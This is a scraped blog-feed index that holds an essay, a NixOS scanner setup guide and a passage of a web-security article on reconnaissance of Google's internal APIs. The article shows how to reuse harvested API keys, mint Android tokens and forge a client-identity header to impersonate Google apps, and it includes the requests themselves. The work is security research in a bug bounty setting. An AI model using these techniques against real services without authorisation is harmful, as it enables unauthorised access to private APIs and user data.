Footnotes \\n\\n \\n \\n \\n\\n Or rather, a polyglot collection of libraries, one per language, like Pulumi .\\xa0 \u21a9 \\n \\n \\n '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:56:49</p>"},{"location":"borretti.me/There%20Is%20No%20New%20Aesthetics_20260105/","title":"There Is No New Aesthetics","text":"<p>\u6765\u6e90: borretti.me \u53d1\u5e03\u65f6\u95f4: Mon, 05 Jan 2026 00:00:00 +0000 \u94fe\u63a5: https://borretti.me/article/there-is-no-new-aesthetics</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' \u201cFor man, or for a man, there can be no new beginnings.\u201d \u2014 David Zindell, Shanidar \\n\\n Re: A Call for New Aesthetics . \\n\\n At some point in the 20th century, we filled out the last few basis vectors of\\nhumanity. We explored the whole game map. This is what it means to live at the\\nend of history: every aesthetic movement, political and economic system you can\\nimagine can be understood as a linear combination of things that have come\\nbefore. Asking for a new aesthetics is like asking for a new continent, one\\nnorth of 90\u00b0 and with imaginary longitude. \\n\\n This is why culture feels stuck, and why every ideology is \u201cneo\u201d or \u201cpost\u201d\\nsomething that came before: we have exhausted humanity. And this is why every\\nresponse to the call for a new aesthetics is to dig up some past artistic\\nmovement, and scale it up linearly. \u201c We offer nothing new except\\ngigantism \u201d. \\n\\n I don\u2019t want to believe this is true, because I want to believe culture is an\\ninfinite game, and inexhaustible. And surely the number of linear\\ncombinations\u2014of distinct ideas humans can have, and works of art we can\\nmake\u2014is so high as to be inexhaustible. But each new remixing brings less\\ninformation than the last. \\n\\n \\n Today, futuristic aesthetics often mean retrofuturistic aesthetics. \\n \\n\\n At the end of history, all futurism is retrofuturism, because the future is\\n contained in the past. The space age, the atomic age, the age of supersonic\\nflight all came and went. Dyson spheres and nanomachines and mind uploading were\\ntheorized and written about decades ago. \\n\\n If there is a new aesthetic, it will have to come from a transhuman\\nculture\u2014from people who are more than, or at least other than, human\u2014or from\\nthe alien minds being born around us. \\n\\n \\n\\n Thanks to M\u00f3nica Belevan for reading the draft of this article. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:56:51</p>"},{"location":"borretti.me/Using%20the%20Brother%20DS-640%20Scanner%20on%20NixOS_20251227/","title":"Using the Brother DS-640 Scanner on NixOS","text":"<p>\u6765\u6e90: borretti.me \u53d1\u5e03\u65f6\u95f4: Sat, 27 Dec 2025 00:00:00 +0000 \u94fe\u63a5: https://borretti.me/article/using-the-brother-ds-640-scanner-on-nixos</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' The DS-640 is a compact USB scanner from Brother . It was surprisingly hard to get it working on NixOS, so I wrote up my solution so others don\u2019t have this problem. The bad news is you need Brother\u2019s proprietary drivers to make this work. \\n\\n You need this configuration: \\n\\n \\n \\n</p>"},{"location":"borretti.me/Using%20the%20Brother%20DS-640%20Scanner%20on%20NixOS_20251227/#enable-sane-scanners","title":"Enable SANE scanners.","text":"<p>\\n hardware . sane . enable = true ; \\n\\n</p>"},{"location":"borretti.me/Using%20the%20Brother%20DS-640%20Scanner%20on%20NixOS_20251227/#add-yourself-to-the-scanner-and-printer-groups","title":"Add yourself to the scanner and printer groups.","text":"<p>\\n users . users . USERNAME . extraGroups = [ \"scanner\" \"lp\" ]; \\n\\n</p>"},{"location":"borretti.me/Using%20the%20Brother%20DS-640%20Scanner%20on%20NixOS_20251227/#add-support-for-brother-scanners","title":"Add support for Brother scanners.","text":"<p>\\n hardware . sane . brscan5 . enable = true ; \\n \\n \\n \\n\\n After applying this you have to log out and in, or reboot, for the usergroup changes to apply. \\n\\n Note also brscan5 : if you use brscan4 (as I did initially), the scanner will kind of work, but it only scans the first third or so of every page. \\n\\n And if you want a GUI: \\n\\n \\n \\n</p>"},{"location":"borretti.me/Using%20the%20Brother%20DS-640%20Scanner%20on%20NixOS_20251227/#install-gnome-document-scanner","title":"Install GNOME Document Scanner.","text":"<p>\\n home-manager . users . USERNAME . home . packages = with pkgs ; [ \\n simple-scan \\n ]; \\n \\n \\n \\n\\n Now, make sure the scanner is there: \\n\\n \\n \\n $ scanimage --list-devices\\ndevice <code>brother5:bus4;dev2\\' is a Brother DS-640 USB scanner\\n \\n \\n \\n\\n If you get Brother *Unknown USB scanner , you either have the wrong driver or (as I did, surprisingly) a faulty USB port. In which case move the scanner to another port. scanimage --list-devices should recognize the model number. \\n\\n The most basic test that should work: put a page in the scanner until it locks and run: \\n\\n \\n \\n $ scanimage --device=\"brother5:bus4;dev2\" \\\\\\n  --format=jpeg \\\\\\n  --output-file=scan.jpg\\n \\n \\n \\n\\n This will produce a (probably not very good) scan in scan.jpg . Now, we can improve things using the device-specific options, which you can check with this command: \\n\\n \\n \\n $ scanimage --all-options --device=\"brother5:bus4;dev2\"\\nAll options specific to device</code>brother5:bus4;dev2\\':\\n    --mode 24bit Color[Fast]|Black &amp; White|True Gray|Gray[Error Diffusion] [24bit Color[Fast]]\\n        Select the scan mode\\n    --resolution 100|150|200|300|400|600|1200dpi [100]\\n        Sets the resolution of the scanned image.\\n    --source Automatic Document Feeder(left aligned) [Automatic Document Feeder(left aligned)]\\n        Selects the scan source (such as a document-feeder).\\n    --brightness -50..50% (in steps of 1) [inactive]\\n        Controls the brightness of the acquired image.\\n    --contrast -50..50% (in steps of 1) [inactive]\\n        Controls the contrast of the acquired image.\\n    --MultifeedDetection[=(yes|no)] [inactive]\\n\\n    --AutoDocumentSize[=(yes|no)] [no] [advanced]\\n\\n    --AutoDeskew[=(yes|no)] [no] [advanced]\\n\\n    --SkipBlankPage[=(yes|no)] [inactive]\\n\\n    --SkipBlankPageSensitivity 0..100% (in steps of 1) [inactive]\\n\\n    -l 0..215.9mm (in steps of 0.0999908) [0]\\n        Top-left x position of scan area.\\n    -t 0..355.6mm (in steps of 0.0999908) [0]\\n        Top-left y position of scan area.\\n    -x 0..215.9mm (in steps of 0.0999908) [215.88]\\n        Width of scan-area.\\n    -y 0..355.6mm (in steps of 0.0999908) [355.567]\\n        Height of scan-area.\\n \\n \\n \\n\\n Try this for a better scan: \\n\\n \\n \\n $ scanimage --device=\"brother5:bus4;dev2\" \\\\n  --AutoDeskew=yes \\\\n  --AutoDocumentSize=yes \\\\n  --resolution 300 \\\\n  --format=jpeg \\\\n  --output-file=scan.jpg\\n \\n \\n \\n\\n Note that some of the flags are in --key value format and others --key=value , and if you mess it up you get a cryptic error message. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:56:55</p>"},{"location":"brutecat.com/","title":"brutecat.com","text":"<p>a web security blog</p> <p>\u7f51\u7ad9: https://brutecat.com RSS: https://brutecat.com/rss.xml</p>"},{"location":"brutecat.com/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":"<ul> <li>Leaking the phone number of any Google user_20260205</li> <li>Disclosing YouTube Creator Emails for a $20k Bounty_20260205</li> <li>Leaking the email of any YouTube user for $10,000_20260205</li> <li>Decoding Google- Converting a Black Box to a White Box_20260205</li> </ul>"},{"location":"brutecat.com/Decoding%20Google-%20Converting%20a%20Black%20Box%20to%20a%20White%20Box_20260205/","title":"Decoding Google: Converting a Black Box to a White Box","text":"<p>\u6765\u6e90: https://brutecat.com \u94fe\u63a5: https://brutecat.com/articles/decoding-google \u65e5\u671f: Fri, 01 Nov 2024 00:00:00 GMT</p> <p>We've all been there - staring at Google's search box, overwhelmed by the maze of complexity hiding behind that minimalist interface, thinking it's impossible to break in. The key to decoding Google? Converting the attack surface from a black box to a white box. The first step is finding all the endpoints that exist, and all of their respective parameters, especially ones that are hidden and aren't used in the actual app and were left from some developer testing, since they likely contain security bugs.  </p>"},{"location":"brutecat.com/Decoding%20Google-%20Converting%20a%20Black%20Box%20to%20a%20White%20Box_20260205/#table-of-contents","title":"Table of Contents","text":"<ul> <li>How Google API authentication works on the web</li> <li>Secret visibility labels</li> <li>How Google API authentication works on Android</li> <li>A word on X-Goog-Spatula</li> <li>Leaking request parameters through error messages</li> </ul> <p>In Google, there's something known as discovery documents that are essentially like swagger documents, intended for listing API methods on Google's public APIs such as their YouTube Data API (discovery). As it turns out, these discovery documents aren't just available for their public APIs but also for their private ones such as the Internal People API (discovery).</p> <p>While this discovery document doesn't require any authentication to view, if we try fetching something like the Takeout Private API, we get the following error:</p> <p>Request</p> <pre><code>GET /$discovery/rest\nHost: takeout-pa.googleapis.com\n</code></pre> <p>Response</p> <pre><code>HTTP/2 403 Forbidden\nContent-Type: application/json; charset=UTF-8\n\n{\n  \"error\": {\n    \"code\": 403,\n    \"message\": \"Method doesn't allow unregistered callers (callers without established identity). Please use API Key or other form of API consumer identity to call this API.\",\n    \"status\": \"PERMISSION_DENIED\"\n  }\n}\n</code></pre> <p>Thankfully, by looking into how Google authentication works, it's possible to get past this.</p>"},{"location":"brutecat.com/Decoding%20Google-%20Converting%20a%20Black%20Box%20to%20a%20White%20Box_20260205/#how-google-api-authentication-works-on-the-web","title":"How Google API authentication works on the web","text":"<p>If we look at a random request to the People Internal API to lookup a Google user from the web that we can find from DevTools on https://chat.google.com:</p> <pre><code>POST /$rpc/google.internal.people.v2.minimal.InternalPeopleMinimalService/GetPeople HTTP/2\nHost: people-pa.clients6.google.com\nCookie: &lt;redacted&gt;\nContent-Type: application/json+protobuf\nX-Goog-Api-Key: AIzaSyB0RaagJhe9JF2mKDpMml645yslHfLI8iA\nOrigin: https://chat.google.com\nAuthorization: SAPISIDHASH &lt;redacted&gt;\n...\n</code></pre> <p>Note: clients6.google.com is an alias for googleapis.com</p> <p>The first important header here is <code>X-Goog-Api-Key</code>. This API key gives us permission to call endpoints in the Internal People API. This specific endpoint requires us to be authenticated with our Google account, which is done through the <code>Cookie</code> header and <code>SAPISIDHASH</code> (this value is generated using the SAPISID cookie)</p> <p>If you're worked with Google Cloud before, you might know that APIs need to be enabled for your project before you can make calls to them. If we tried taking this key and doing a call to some random unrelated API like the Play Atoms Private API <code>playatoms-pa.googleapis.com</code></p> <pre><code>GET /$discovery/rest\nHost: playatoms-pa.googleapis.com\nX-Goog-Api-Key: AIzaSyB0RaagJhe9JF2mKDpMml645yslHfLI8iA\n</code></pre> <p>We would get the following error:</p> <pre><code>{\n  \"error\": {\n    \"code\": 403,\n    \"message\": \"Play Atoms Private API has not been used in project 576267593750 before or it is disabled. Enable it by visiting https://console.developers.google.com/apis/api/playatoms-pa.googleapis.com/overview?project=576267593750 then retry. If you enabled this API recently, wait a few minutes for the action to propagate to our systems and retry.\",\n    ...\n  }\n}\n</code></pre> <p>This is because just like Google Cloud projects we can make ourselves, the API key we found is tied to some Google-owned Cloud project, which doesn't have the Play Atoms Private API enabled for it.</p> <p>However, this key does in fact work for the staging environment of the Internal People API which otherwise without authentication isn't public:</p> <p>Request</p> <pre><code>GET /$discovery/rest\nHost: staging-people-pa.sandbox.googleapis.com\nReferer: https://chat.google.com\nX-Goog-Api-Key: AIzaSyB0RaagJhe9JF2mKDpMml645yslHfLI8iA\n</code></pre> <p>Note: all staging/test endpoints are under *.sandbox.googleapis.com. This API key also requires the use of the chat.google.com Referer header.</p> <p>Response</p> <pre><code>HTTP/2 200 OK\nContent-Type: application/json; charset=UTF-8\n\n{\n  \"title\": \"Internal People API - Staging\",\n  \"documentationLink\": \"http://boq/java/com/google/social/boq/release/socialgraphapiserver\",\n  \"discoveryVersion\": \"v1\",\n  \"id\": \"people_pa:v2\",\n  \"revision\": \"20241031\",\n  ...\n}\n</code></pre> <p>Unlike the public discovery document, this version contains comments for everything, leaking a lot of how stuff works behind-the-scenes:</p> <pre><code>...\n    \"InAppNotificationTarget\": {\n      \"id\": \"InAppNotificationTarget\",\n      \"description\": \"How and where to send notifications to this person in other apps, and why the requester can do so. See go/reachability for more info. \\\"How\\\" and \\\"where\\\" identify the recipient in a P2P Bridge (glossary/p2p bridge), and \\\"why\\\" may be helpful in a UI to disambiguate which of several ways may be used to contact the recipient. How: Via a Google profile or a reachable-only phone number that the requester has access to. Specified in the target \\\"type\\\" and \\\"value\\\". Where: Apps in which the profile/phone number owner may receive notifications. Specified in the repeated \\\"app\\\". Why: Which fields in, e.g., a contact associated with this person make the notification target info visible to the requester. Specified in the repeated originating_field param. Example: Alice has a contact Bob, with: Email 0 = bob@gmail.com Phone 0 = +12223334444 Phone 1 = +15556667777 Email 0 and Phone 0 let Alice see Bob's public profile (obfuscated gaia ID = 123). Public profiles are visible by email by default, and Bob has explicitly made it visible via Phone 0. Bob says people can send notifications to his public profile in YouTube. Phone 2 is associated with another Google profile that Bob owns, but he doesn't want others to see it. He is okay with people sending notifications to him in Who's Down if they have this phone number, however. There will be separate InAppNotificationTargets: one for Bob's public Google profile, and one for the second phone number, which is in his private profile. IANT #1 - targeting Bob's public profile (visible via Email 0 and Phone 0): app = [YOUTUBE] type = OBFUSCATED_GAIA_ID value = 123 originating_field: [ { field_type = EMAIL, field_index = 0 } // For Email 0 { field_type = PHONE, field_index = 0 } // For Phone 0 ] IANT #2 - targeting Bob's private profile phone number Phone 1: app = [WHOS_DOWN] type = PHONE value = +15556667777 originating_field: [ { field_type = PHONE, field_index = 1 } // For Phone 1 ]\",\n...\n</code></pre> <p>Update 2025-02-06: Google has removed all comments from the staging discovery doc.</p>"},{"location":"brutecat.com/Decoding%20Google-%20Converting%20a%20Black%20Box%20to%20a%20White%20Box_20260205/#secret-visibility-labels","title":"Secret visibility labels","text":"<p>As it turns out, certain Google cloud projects have visibility labels enabled for them, giving them more access than others. Endpoints can be hidden behind visibility labels, and they won't show up in the discovery document unless the secret <code>labels</code> parameter is provided. This was discovered by an awesome researcher Ezequiel Pereira who now works at Google.</p> <p>For instance, if we use the API key <code>AIzaSyCI-zsRP85UVOi0DjtiCwWBwQ1djDy741g</code> that we can find from console.cloud.google.com and try fetching the discovery document for <code>servicemanagement.googleapis.com</code></p> <p>Request</p> <pre><code>GET /$discovery/rest HTTP/2\nHost: servicemanagement.googleapis.com\nContent-Type: application/json\nX-Goog-Api-Key: AIzaSyCI-zsRP85UVOi0DjtiCwWBwQ1djDy741g\nReferer: https://console.cloud.google.com\n</code></pre> <p>The response would have 214k bytes. However, if we try this same request with <code>&amp;labels=PANTHEON</code></p> <pre><code>GET /$discovery/rest?labels=PANTHEON HTTP/2\nHost: servicemanagement.googleapis.com\nContent-Type: application/json\nX-Goog-Api-Key: AIzaSyCI-zsRP85UVOi0DjtiCwWBwQ1djDy741g\nReferer: https://console.cloud.google.com\n</code></pre> <p>The response now has 329k bytes and there's a lot more hidden documentation revealed.</p> <p>Additionally, certain APIs like the Internal People API provide extra permissions for specific API clients. So far, we've covered how we can use API keys to fetch discovery documents or access endpoints in the context of Google Cloud projects that have their keys used in Google web services. However, by learning how authorization works on Android, we can get access to the context of lot more Google Cloud projects.</p>"},{"location":"brutecat.com/Decoding%20Google-%20Converting%20a%20Black%20Box%20to%20a%20White%20Box_20260205/#how-google-api-authentication-works-on-android","title":"How Google API authentication works on Android","text":"<p>If you've ever logged into a Google account via Google Play Services (GPS) on an Android device, you might have noticed that all Google apps are able to authenticate as your Google account seamlessly, without having to manually log into each one.</p> <p>The way this works is your Google account's Android session is actually tied to a refresh token that's generated the first time you log in. Unlike on the web where Google internal APIs use cookies for authentication, on Android and iOS scoped bearer tokens generated from a refresh token are used instead. On Android, that same Internal People API request would look something like this:</p> <pre><code>POST /$rpc/google.internal.people.v2.minimal.InternalPeopleMinimalService/GetPeople HTTP/2\nHost: people-pa.clients6.google.com\nContent-Type: application/json+protobuf\nAuthorization: ya29.&lt;redacted&gt;\n...\n</code></pre> <p>There is no need for an API key for this request, as the bearer token actually includes the context of the Google API project that you used to generate the bearer token. (this will make more sense once we look into how bearer tokens are generated from an android refresh token)</p> <p>The interesting thing about some Google APIs is that requests from the context of certain Google Cloud project IDs have extra functionality/permissions enabled just for that project on that API. This is usually based on the requirements of the client (ex. the Google Chat app may need to be able to fetch extra information on other Google users from the Internal People API as compared to something like Google Earth)</p>"},{"location":"brutecat.com/Decoding%20Google-%20Converting%20a%20Black%20Box%20to%20a%20White%20Box_20260205/#android-refresh-tokens-aasxx","title":"Android Refresh Tokens (aas/xx)","text":"<p>So, how can we generate an Android refresh token to use for testing? It's actually quite simple. We can simply visit https://accounts.google.com/EmbeddedSetup, go through the authentication flow, and at the end there will be a cookie set called <code>oauth_token</code></p> <p>We can then do the following request to exchange this oauth_token for an Android refresh token:</p> <pre><code>POST /auth\nHost: android.googleapis.com\nUser-Agent: com.google.android.gms/243530022\nContent-Type: application/x-www-form-urlencoded\n\nandroidId=fb213fefa471dcde&amp;Token=&lt;oauth_token&gt;&amp;service=ac2dm&amp;get_accountid=1&amp;ACCESS_TOKEN=1&amp;callerPkg=com.google.android.gms&amp;add_account=1&amp;callerSig=38918a453d07199354f8b19af05ec6562ced5788\n</code></pre> <p>The <code>androidId</code> is just any random 16 character hex string. At the moment you don't require this for generating a bearer token, but this could change in the future so it's advisable to store it along with your Android refresh token.  </p> <p>On newer Android versions, a DroidGuard token is also supplied to this request. My guess is that it's likely an anti-abuse measure. However, they're unable to enforce this token without breaking Google Play Services support for older Android devices. It's possible this could be changed in the future though.</p> <p>The response to the request will look something like this:</p> <pre><code>HTTP/2 200 OK\nContent-Type: text/plain; charset=utf-8\n\nToken=aas_et/&lt;redacted&gt;\nAuth=g.a000&lt;redacted&gt;\nSID=BAD_COOKIE\nLSID=BAD_COOKIE\nservices=mail,hist,dynamite,cl,youtube,jotspot,uif,multilogin,analytics\nEmail=&lt;redacted&gt;@gmail.com\nGooglePlusUpdate=0\nfirstName=&lt;redacted&gt;\nlastName=&lt;redacted&gt;\ncapabilities.canHaveUsername=1\ncapabilities.canHavePassword=1\n...\n</code></pre> <p>You can actually see this Android device on https://myaccount.google.com/device-activity</p>"},{"location":"brutecat.com/Decoding%20Google-%20Converting%20a%20Black%20Box%20to%20a%20White%20Box_20260205/#generating-a-bearer-token","title":"Generating a Bearer Token","text":"<p>Now that you have an Android refresh token, you can use this to generate a bearer token in the context of a Android app's Google Cloud project with the scopes that you require.</p> <p>This is an example request to generate scopes for Google Play Games to use with <code>playgateway-pa.googleapis.com</code></p> <pre><code>POST /auth HTTP/2\nHost: android.googleapis.com\nUser-Agent: GoogleAuth/1.4\nContent-Length: 808\nContent-Type: application/x-www-form-urlencoded\n\nandroidId=fb213fefa471dcde&amp;app=com.google.android.play.games&amp;service=oauth2:https://www.googleapis.com/auth/games.firstparty https://www.googleapis.com/auth/googleplay&amp;client_sig=38918a453d07199354f8b19af05ec6562ced5788&amp;has_permission=1&amp;Token=&lt;redacted&gt;\n</code></pre> <p>Let's breakdown everything in that request:</p> Parameter Explanation android_id This isn't validated, it can be any 16 character hex string app Package name of the app that's cloud project context you wish to use. service Space seperated scopes client_sig SHA1 hash in hex format of the app's signature has_permission Only required on few android clients that don't have auto mode enabled for them. Token Your Android refresh token <p>It's actually possible to omit <code>client_sig</code> and <code>app</code> for certain scopes, but you wouldn't have the context of the Google API project and this does not work for most scopes.</p> <p>The first problem we have is, let's say we want to get authentication on the following Google Internal People API endpoint: <code>https://people-pa.googleapis.com/v2/people</code> to start playing around with it, how would we know what scopes this endpoint needs?</p> <p>In this case, there's a public discovery document that lists all the endpoints and the scopes for each of them, but many Google APIs may require an API key to access the discovery document which we may not always have (ex. gameswhitelisted).</p> <p>Turns out, if we send a request to an endpoint with a bearer token with insufficient scopes, it actually tells us all the scopes we need:</p> <p>Request</p> <pre><code>GET /v2/people\nHost: people-pa.googleapis.com\nAuthorization: Bearer ya29.&lt;redacted&gt;\n</code></pre> <p>Response</p> <pre><code>HTTP/2 403 Forbidden\nWww-Authenticate: Bearer realm=\"https://accounts.google.com/\", error=\"insufficient_scope\", scope=\"https://www.googleapis.com/auth/peopleapi.legacy.readwrite https://www.googleapis.com/auth/plus.peopleapi.readwrite https://www.googleapis.com/auth/peopleapi.readonly https://www.googleapis.com/auth/peopleapi.readwrite openid https://www.googleapis.com/auth/plus.me\"\nContent-Type: application/json; charset=UTF-8\n\n{\n  \"error\": {\n    \"code\": 403,\n    \"message\": \"Request had insufficient authentication scopes.\",\n    ...\n        \"metadata\": {\n          \"service\": \"people-pa.googleapis.com\",\n          \"method\": \"google.internal.people.v2.InternalPeopleService.GetPeople\"\n        }\n    ...\n  }\n}\n</code></pre> <p>Something interesting to note: <code>google.internal.people.v2.InternalPeopleService.GetPeople</code> is actually the gRPC service name of the endpoint.</p> <p>To simply this process, I wrote a Go script that I've published on GitHub that we can use to easily get this information:</p> <pre><code>$ export ANDROID_REFRESH_TOKEN=\"&lt;redacted&gt;\"\n$ git clone https://github.com/ddd/req2proto\n$ cd tools/gapi-service\n$ go build # this requires golang to be installed, see https://go.dev/doc/install\n$ ./gapi-service -e https://people-pa.googleapis.com/v2/people\nscopes: https://www.googleapis.com/auth/peopleapi.legacy.readwrite https://www.googleapis.com/auth/plus.peopleapi.readwrite https://www.googleapis.com/auth/peopleapi.readwrite\nmethod: google.internal.people.v2.InternalPeopleService.InsertPerson\nservice: people-pa.googleapis.com\n</code></pre> <p>Now that we have the scopes we need. Let's say we want to call this endpoint in the context of Google Chat. We can get the package name <code>com.google.android.apps.dynamite</code> from the Play Store web URL (https://play.google.com/store/apps/details?id=com.google.android.apps.dynamite) but we still need the <code>client_sig</code> of the app.</p> <p>While this is true for most cases, the client signature isn't necessarily always the SHA1 hash of the target app's signature. To solve this problem, I collected the package names as well as SHA1 client signature of all Google apps and wrote a Rust program that bruteforces all SHA1 signature and package name combinations to find working ones. You can find the output of this script here</p> <p>We can simply search this file for <code>com.google.android.apps.dynamite</code> and we can see that the client_sig <code>519c5a17a60596e6fe5933b9cb4285e7b0e5eb7b</code> works for this app:</p> <pre><code>\"com.google.android.apps.dynamite\": [\n    {\n      \"spatula\": \"CkAKIGNvbS5nb29nbGUuYW5kcm9pZC5hcHBzLmR5bmFtaXRlGhxVWnhhRjZZRmx1YitXVE81eTBLRjU3RGw2M3M9GLingOeJmKD6Ng==\",\n      \"sig\": \"519c5a17a60596e6fe5933b9cb4285e7b0e5eb7b\"\n    }\n  ],\n</code></pre>"},{"location":"brutecat.com/Decoding%20Google-%20Converting%20a%20Black%20Box%20to%20a%20White%20Box_20260205/#a-word-on-x-goog-spatula","title":"A word on X-Goog-Spatula","text":"<p>Even though we may have authentication in the context of an app's Google API project, we can't just fetch the discovery document with it. That's where <code>X-Goog-Spatula</code> comes in. If you've ever looked at Android traffic to Google APIs, you might have noticed this header.</p> <p>It's actually just a keyless authentication header. Similar to an API key, it's used to provide context to a specific Google Cloud project.</p> <p>They look like this (base64-encoded protobuf): <code>Cj0KHWNvbS5nb29nbGUuYW5kcm9pZC5wbGF5LmdhbWVzGhxPSkdLUlQwSEdaTlUrTEdhOEY3R1ZpenRWNGc9GLingOeJmKD6Ng==</code></p> <p>If we look at how this is formed:</p> <pre><code>$ echo -n \"Cj0KHWNvbS5nb29nbGUuYW5kcm9pZC5wbGF5LmdhbWVzGhxPSkdLUlQwSEdaTlUrTEdhOEY3R1ZpenRWNGc9GLingOeJmKD6Ng==\" | base64 -d | protoc --decode_raw\n1 {\n  1: \"com.google.android.play.games\" // package name\n  3: \"6Zi8TwQNyiOD+us24/5aYpwxt5A=\" // base64 of SHA1 hash of the app signature\n}\n3: 3959931537119515576 // this is generated from DroidGuard using the device_key\n</code></pre> <p>This example is from some Spatula header I found on the internet</p> <p>If you wish to dive into how this DroidGuard value is generated, there's an awesome gist on this, but we don't actually need to care about that in order to utilize it. As it turns out, this value isn't actually validated, and we can impersonate any client we want by simply changing the package name and SHA1 hash of the app signature.</p> <p>Since just like API keys, they provide context of a Google Cloud project, we're actually able to use this to fetch discovery documents of several Android Google APIs like <code>gameswhitelisted.googleapis.com</code>:</p> <p>Request</p> <pre><code>GET /$discovery/rest\nHost: gameswhitelisted.googleapis.com\nX-Goog-Spatula: Cj0KHWNvbS5nb29nbGUuYW5kcm9pZC5wbGF5LmdhbWVzGhxPSkdLUlQwSEdaTlUrTEdhOEY3R1ZpenRWNGc9GLingOeJmKD6Ng==\n</code></pre> <p>Response</p> <pre><code>HTTP/2 200 OK\nContent-Type: application/json; charset=UTF-8\n\n{\n  \"kind\": \"discovery#restDescription\",\n  \"description\": \"Internal-only 1P access to the oneup APIs.\",\n  ...\n</code></pre> <p>We can actually use this along with Cookie authentication on the web, as a direct replacement for <code>X-Goog-Api-Key</code> to get us access to the context of an Android app's Google Cloud project</p>"},{"location":"brutecat.com/Decoding%20Google-%20Converting%20a%20Black%20Box%20to%20a%20White%20Box_20260205/#leaking-request-parameters-through-error-messages","title":"Leaking request parameters through error messages","text":"<p>Occasionally we may come across Google APIs where there's seemingly no way to access the discovery document. This could be due to not being able to find a working API key/spatula, 404 page or otherwise. One such example is YouTube's Internal API:</p> <p>Request</p> <pre><code>GET /$discovery/rest\nHost: youtubei.googleapis.com\n</code></pre> <p>Response</p> <pre><code>HTTP/2 405 Method Not Allowed\nContent-Type: text/html; charset=UTF-8\nReferrer-Policy: no-referrer\n...\n</code></pre> <p>Fun fact: there's actually 2 workaround methods to leaking the discovery document of the Innertube API. Are you able to find them? :) Update 2025-03-01: Google has removed both the prod (archive) and staging (archive) discovery documents.</p> <p>If we take a look at a random Innertube API endpoint, such as <code>/youtubei/v1/browse</code> endpoint and clean it up:</p> <pre><code>POST /youtubei/v1/browse HTTP/2\nHost: youtubei.googleapis.com\nContent-Type: application/json\nContent-Length: 164\n\n{\n  \"context\": {\n    \"client\": {\n      \"clientName\": \"WEB\",\n      \"clientVersion\": \"2.20241101.01.00\",\n    }\n  },\n  \"browseId\": \"UCX6OQ3DkcsbYNE6H8uQQuVA\"\n}\n</code></pre> <p>The request payload is in the json format. The <code>browseId</code> seems to be accepting the YouTube Channel ID as a string. What happens if we change that to a boolean like <code>true</code></p> <p>Request</p> <pre><code>POST /youtubei/v1/browse HTTP/2\nHost: youtubei.googleapis.com\nContent-Type: application/json\nContent-Length: 141\n\n{\n  \"context\": {\n    \"client\": {\n      \"clientName\": \"WEB\",\n      \"clientVersion\": \"2.20241101.01.00\",\n    }\n  },\n  \"browseId\":true\n}\n</code></pre> <p>Response</p> <pre><code>HTTP/2 400 Bad Request\nContent-Type: application/json; charset=UTF-8\nServer: scaffolding on HTTPServer2\n\n{\n  \"error\": {\n    \"code\": 400,\n    \"message\": \"Invalid value at 'browse_id' (TYPE_STRING), true\",\n    \"errors\": [\n      {\n        \"message\": \"Invalid value at 'browse_id' (TYPE_STRING), true\",\n        \"reason\": \"invalid\"\n      }\n    ],\n    \"status\": \"INVALID_ARGUMENT\",\n    \"details\": [\n      {\n        \"@type\": \"type.googleapis.com/google.rpc.BadRequest\",\n        \"fieldViolations\": [\n          {\n            \"field\": \"browse_id\",\n            \"description\": \"Invalid value at 'browse_id' (TYPE_STRING), true\"\n          }\n        ]\n      }\n    ]\n  }\n}\n</code></pre> <p>It tells us that <code>browse_id</code> is a TYPE_STRING. So awesome, we can leak the parameter type if we know the parameter name. But how can we take this a step further?</p> <p>As it turns out, in Google, there's 4 different content types:</p> <ul> <li>application/json (aka. JSON)</li> <li>application/json+protobuf (aka. ProtoJson)</li> <li>application/x-protobuf (aka. Proto over HTTP fallback)</li> <li>application/grpc</li> </ul> <p>In Google, all endpoints are defined in <code>.proto</code> files such that they can be queried over gRPC. To allow for JSON, ProtoJson and Proto over HTTP, there's a Extensible Service Proxy (ESP) that transcodes these requests to gRPC before they hit the actual Google microservice.</p> <p>For instance, if a requests JSON payload looks like this:</p> <pre><code>{\n  \"name\": \"John Smith\",\n  \"age\": 25,\n  \"favoriteColor\": \"orange\"\n}\n</code></pre> <p>The protobuf representation of this would look like this:</p> <pre><code>message Request {\n  string name = 1;\n  string age = 2;\n  string favourite_color = 3;\n}\n</code></pre> <p>The idea with protobuf is that sending <code>\"name\"</code>, <code>\"age\"</code> and <code>\"favoriteColor\"</code> from the client to the server in every request is a waste of bandwidth especially if the server knows what to expect from the client. Hence, protobuf is just a binary format compressing the data as much as possible. It does this by assigning everything an index (ex. name is 1, age is 2 etc.)</p> <p>ProtoJson is similar to this, except you just send an array rather than compressing it to protobuf:</p> <pre><code>[\n  \"John Smith\",\n  25,\n  \"orange\"\n]\n</code></pre> <p>You can probably see where we're going with this, what if we just sent the following to this endpoint:</p> <pre><code>[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]\n</code></pre> <p>Request</p> <pre><code>POST /youtubei/v1/browse HTTP/2\nHost: youtubei.googleapis.com\nContent-Type: application/json+protobuf\nContent-Length: 22\n\n[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]\n</code></pre> <p>Response</p> <pre><code>HTTP/2 400 Bad Request\nContent-Type: application/json; charset=UTF-8\nServer: scaffolding on HTTPServer2\n\n{\n  \"error\": {\n    \"code\": 400,\n    \"message\": \"Invalid value at 'context' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext), 1\\nInvalid value at 'browse_id' (TYPE_STRING), 2\\nInvalid value at 'params' (TYPE_STRING), 3\\nInvalid value at 'continuation' (TYPE_STRING), 7\\nInvalid value at 'force_ad_format' (TYPE_STRING), 8\\nInvalid value at 'player_request' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.PlayerRequest), 10\\nInvalid value at 'query' (TYPE_STRING), 11\\nInvalid value at 'has_external_ad_vars' (TYPE_BOOL), 12\\nInvalid value at 'force_ad_parameters' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.ForceAdParameters), 13\\nInvalid value at 'previous_ad_information' (TYPE_STRING), 14\\nInvalid value at 'offline' (TYPE_BOOL), 15\\nInvalid value at 'unplugged_sort_filter_options' 